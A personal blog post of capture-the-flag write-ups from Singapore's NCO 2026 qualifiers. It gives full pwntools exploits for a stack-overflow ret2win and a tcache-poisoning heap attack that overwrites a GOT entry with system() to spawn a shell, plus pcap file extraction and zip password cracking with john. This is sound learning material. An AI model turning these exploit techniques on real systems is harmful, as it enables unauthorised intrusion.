---
title: National Cybersecurity Olympiad 2026 Qualifiers (Singapore) Writeups
published: 2026-03-10
description: 'Could have been better'
image: ''
tags: ["Ctf", "Pwn", "Forensics"]
category: 'CTF Writeups'
draft: false 
lang: ''
---

# Preamble

On the 7th of March 2026, I participated in the qualifiers for Singapore's National Cybersecurity Olympiad (NCO) 2026. Whilst my performance was lower than I expected, I nonetheless had an interesting time doing the challenges, especially without internet access. Here are the writeups for some of the challenges I solved/upsolved.

# Pwn

On hindsight, I massively threw this category and under-performed, clinching a grand total of *zero* points during the competition. On hindsight, I could have solved some of the challenges during the competition itself, and here are the challenges I upsolved soon after the competition.

## Pwn-Sum

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win() {
    system("cat flag.txt");
    exit(0);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf("Welcome to the calculator! Enter 0 to finish.\n");
    int64_t arr[100] = {0};
    int nums = 0;
    do {
        printf("Enter number %llu: ", nums + 1);
        scanf("%lld", &arr[nums]);
        nums++;
    } while(arr[nums-1] != 0);
    int64_t sum = 0;
    for (int i = 0; i < nums; i++) {
        sum += arr[i];
    }
    printf("The total sum is: %lld\n", sum);
    return 0;
}

```

Looking at the source code provided, we immediately see that it is some sort of `ret2win` challenge. We are provided with a loop that infinitely reads a 64bit number into increasing indexes of the array `arr`. This allows us to gain arbitrary write capabilities, allowing us to overwrite the return pointer in the stack for `main()` and return to `win()`.

```
NCO/pwn/pwn-sum via  v15.2.1-gcc via  v3.13.12 (.venv)
❯ checksec chal_patched
[*] '/home/sherlock/Documents/CTF/NCO/pwn/pwn-sum/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
    Debuginfo:  Yes
```

Looking at checksec, we see that there is no canary and no PIE, which means that we are able to directly overwrite the return pointer by writing to indexes `num` > 100.

![IDA stack view](/images/ctf/nco2026_quals_pwn_sum1.png)

Looking at the stack layout for `main()` in IDA, we can see that we will need to overwrite `0x340 + 0x8 = 0x348` bytes of data in order to reach the return pointer. This means that we will have to write `0x69` (105) values to the array.

However, we must take care not to overwrite `num`, as the top 4 bytes of the value when `num` = 103 is `num`. Hence, for when `num` = 103, we need to input `103 << 32` in order to not corrupt the `num` value.

Hence:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]
context.gdb_binary = "/usr/bin/pwndbg"

gdbscript = """
set breakpoint pending on
b *0x0000000000401267
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    for i in range(0, 103):
        r.sendlineafter(b": ", b"1")
    # do not clobber 103 nums
    r.sendlineafter(b": ", str(103 << 32).encode())
    r.sendlineafter(b": ", b"1")
    ret = 0x000000000040117A
    r.sendlineafter(b": ", str(ret).encode())
    r.sendlineafter(b": ", b"0")
    r.interactive()


if __name__ == "__main__":
    main()

```

This should have been quite a simple solve, but i ran out of time due to being choked at pwn-flag-shop.

## Pwn-Delta

```c
#include <malloc.h>

#define MAX 0x7

void *allocs[MAX];

int get_num() {
  char buf[0x20];
  fgets(buf, 0x20, stdin);
  return atoi(buf);
}

int get_idx() {
  int idx = get_num();
  if (idx < 0 || idx >= MAX) {
    puts("invalid idx");
    return -1;
  }
  return idx;
}

void create() {
  int idx = 0;
  int size = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  printf("size > ");
  size = get_num();
  if (size < 0 || size > 0x1000) {
    puts("invalid size");
    return;
  }

  allocs[idx] = malloc(size);

  printf("input > ");
  fgets(allocs[idx], size, stdin);
}

void delete() {
  int idx = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  free(allocs[idx]);
}

void edit() {
  int idx = 0;
  int delta = 0;

  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  printf("delta > ");
  delta = get_num();
  if (delta < -0x1000 || delta > 0x1000) {
    puts("invalid change");
    return;
  }

  *(size_t *)allocs[idx] += delta;
}

void read() {
  int idx = 0;
  printf("idx > ");
  idx = get_idx();
  if (idx == -1) {
    return;
  }

  if (allocs[idx] == NULL) {
    puts("invalid idx");
    return;
  }

  printf("content: ");
  puts(allocs[idx]);
}

void menu() {
  puts("1. create");
  puts("2. delete");
  puts("3. edit");
  puts("4. read");
  printf("> ");
}

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

int main() {
  setup();
  char buf[0x20];
  int choice = 0;

  while (1) {
    menu();
    fgets(buf, 0x20, stdin);
    choice = atoi(buf);
    switch (choice) {
      case 1:
        create();
        break;
      case 2:
        delete();
        break;
      case 3:
        edit();
        break;
      case 4:
        read();
        break;
      default:
        puts("invalid choice");
    }
  }
}

```

We see the use of `malloc()` and `free()`, hence it immediately jumps as a heap challenge. `edit()` allows us to commit a use-after-free (UAF), so hence this is probably some heap bin metadata corruption challenge. We can use tcache poisoning in order to overwrite some function's address to pop a shell, however, since this challenge uses libc 2.35, we need to work around some safety mitigations.

We observe that the `edit()` function only allows us to touch the first 8 bytes of the tcache structure, hence we are unable to corrupt the bk (key) in order to commit a double free. That is ok though, we still can use `edit()` to incrementally increase/decrease the hex value in the first 8 bytes.

Furthermore, in libc > 2.32, the `fd` of the tcache is mangled using `mangled_ptr = next_ptr ^ (this_ptr >> 12)`. This means that we have to leak what `(this_ptr >> 12)` could possibility be. This can be achieved by leaking the `fd` of the chunk at the end of the tcache bin, where `mangled_ptr = NULL ^ (this_ptr >> 12)`. Since it is xored by null, we can get `(this_ptr >> 12)`, and if we allocate chunks A and B such that head -> B -> A and A and B are close by on the same heap page, we can use the value of  `(this_ptr >> 12)` from A for B (as rightshift 12 discards the last 3 "nibbles" of the address) to find the address of A, and therefore, the address of B.

In order to call system, we also need to leak the base of libc. This can be done via the unsorted bin, where the `fd` of the end of the unsorted bin points to `main_arena+96` in libc. By leaking the `fd`, we can calculate the base of libc.

To pop a shell, we can simply overwrite the got of a function with `system()`. Here, I chose `atoli()` for convenience. We overwrite the tcache `fd` for a chunk to the got for `atoli()` using `edit()`, and when allocated with `malloc()` we can set it to `system()`.

Just to make sure the GOT is writable:

    NCO/pwn/pwn-delta via  v15.2.1-gcc via  v3.13.12 (.venv)
    ❯ checksec chal_patched
    [*] '/home/sherlock/Documents/CTF/NCO/pwn/pwn-delta/chal_patched'
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x3fe000)
        RUNPATH:    b'.'
        Stripped:   No

Hence:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]
context.gdb_binary = "/usr/bin/pwndbg"

gdbscript = """
set breakpoint pending on
b *0x00000000004014FF
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    def alloc(size, idx, data):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"idx > ", str(idx).encode())
        r.sendlineafter(b"size > ", str(size).encode())
        r.sendlineafter(b"input > ", data)

    def free(idx):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"idx > ", str(idx).encode())

    def edit(idx, data):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"idx > ", str(idx).encode())
        r.sendlineafter(b"delta > ", str(data).encode())

    def view(idx):
        r.sendlineafter(b"> ", b"4")
        r.sendlineafter(b"idx > ", str(idx).encode())
        r.recvuntil(b"content: ")
        return r.recvline()[:-1]

    # libc leak via unsorted
    alloc(0x500, 0, b"U")
    alloc(0x20, 1, b"guard")
    free(0)
    libc_main_arena = u64(view(0)[:6].ljust(8, b"\x00"))
    libc_base = libc_main_arena - libc.sym["main_arena"] - 96
    info(f"libc leak: {hex(libc_main_arena)}, libc base: {hex(libc_base)}")
    alloc(0x20, 0, b"A")
    alloc(0x20, 1, b"B")
    alloc(0x20, 2, b"C")
    free(0)
    free(1)
    free(2)
    # head -> C -> B -> A
    # Need to unmangle pointers
    a_mangled = u64(view(0)[:6].ljust(8, b"\x00"))  # a_addr >> 12
    b_mangled = u64(view(1)[:6].ljust(8, b"\x00"))  # a_addr ^ (b_addr >> 12)

    a_addr = b_mangled ^ a_mangled
    b_addr = a_addr + 0x30
    b_key = b_addr >> 12

    info(f"A addr: {hex(a_addr)}, B addr: {hex(b_addr)}, b_key: {hex(b_key)}")
    # mangle B to point at atoi got instead
    atoli_mangled = exe.got["atoi"] ^ b_key
    delta = atoli_mangled - b_mangled
    info(f"delta: {delta}")
    remaining = delta
    while remaining != 0:
        if remaining > 0x1000:
            edit(1, 0x1000)
            remaining -= 0x1000
            info(remaining)
        elif remaining < -0x1000:
            edit(1, -0x1000)
            info(remaining)
            remaining += 0x1000
        else:
            edit(1, remaining)
            remaining = 0
    # head -> C -> B -> atoli
    alloc(0x20, 3, b"D")
    alloc(0x20, 4, b"E")
    alloc(0x20, 5, p64(libc_base + libc.sym["system"]))
    # atoli written with system
    r.sendlineafter(b"> ", b"/bin/sh\x00")
    r.interactive()


if __name__ == "__main__":
    main()

```

# Forensics

Forensics was honestly ok, barring some _sneaky_ tricks put in by the chall authors.

## Forensics-Chat

We are provided with a Wireshark `.pcap` which contains IRC chat logs, as well as FTP TCP streams. Inspecting the chat logs, we learn that the user is downloading a pdf from the FTP server with the password potato_croquette.  Hence, we can follow the FTP TCP stream to extract the bytes:

```python
from pwn import * # yes pwntools do not question

file = b""
segments = [
    # B64-encoded segments of the tcp data go here
]
for i in segments:
    file += b64d(i)
write("flag.pdf", file)

```

Opening the pdf, however, we observe that it is blank and white. How could that be?

Well, it turns out that there are text elements hidden in white. Hahaha.

![Image of PDF](/images/ctf/nco2026_quals_forens_chat1.png)

## Forensics-disk

This was rather trivial, so here are my condensed solve steps:

1. Mount the image into ftk imager

2. Observe that there is flag.zip and a note that says it uses insecure 5 digit password

3. Extract flag.zip and run it through `zip2john` and `john`

4. Extract the contents with cracked password and profit

Honestly quite an easy disk forensics task.

# Epilogue

To be very frank, I felt that I could have done much better for NCO 2026 Qualifiers as a whole. More room for improvement, I guess.
